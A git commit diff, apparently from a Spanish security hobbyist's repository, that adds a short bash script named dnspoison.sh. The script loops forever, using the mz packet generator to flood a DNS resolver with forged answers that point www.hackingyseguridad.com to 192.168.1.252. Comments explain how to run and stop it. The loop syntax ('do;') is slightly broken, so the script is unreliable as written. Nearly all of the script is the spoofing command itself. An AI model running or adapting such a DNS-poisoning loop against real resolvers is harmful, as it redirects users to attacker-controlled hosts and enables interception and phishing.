75a79131169a82df7e7483bd3d301287cf804222
hackingyseguridad <antonio_taboada@hotmail.es>
2019-08-09 17:56:04 +0200

    Update dnspoison.sh

--- dnspoison.sh
+++ dnspoison.sh
@@ -1,4 +1,12 @@
+#!/bin/bash
+# Embenenamiento respusta DNS
+# Antonio Taboada 09/08/2019
+# Aplicar permisos con chmod *x dnspoison.sh
+# Ejecutar ./dnspoison.sh
+# Para parar Control + C
 
+while : ; do;
 
+mz eth0  -B 194.179.1.100 -t dns "q=www.hackingyseguridad.com, a=192.168.1.252"
 
-mz eth0  -B 194.179.1.101 -t dns "q=www.hackingyseguridad.com, a=192.168.1.252"
+done;
